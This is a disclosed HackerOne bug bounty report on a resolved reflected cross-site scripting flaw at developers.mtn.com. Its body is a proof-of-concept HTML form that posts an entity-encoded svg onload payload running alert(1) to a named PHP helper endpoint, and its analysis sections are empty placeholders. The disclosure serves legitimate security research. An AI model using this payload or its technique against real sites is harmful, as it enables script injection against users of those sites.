---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '924851'
original_report_id: '924851'
title: xss on [developers.mtn.com]
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2020-07-15T21:28:33.488Z'
disclosed_at: '2022-04-19T07:58:39.100Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
asset_identifier: mtn.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# xss on [developers.mtn.com]

## Metadata

- HackerOne Report ID: 924851
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2022-04-19T07:58:39.100Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

xss on 

`<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&quot;title&quot;&#58;&quot;Do&#32;you&#32;have&#32;sample&#32;or&#32;reference&#32;applications&#32;that&#32;could&#32;demonstrate&#32;some&#32;API&#32;calls&#32;for&#32;me&#63;&quot;&#44;&quot;helpful&quot;&#58;&quot;false&lt;svg&#32;onload" value="alert&#40;1&#41;&gt;&quot;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>`

{F908897}

## Impact

POC 
{F908895}

{F908896}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
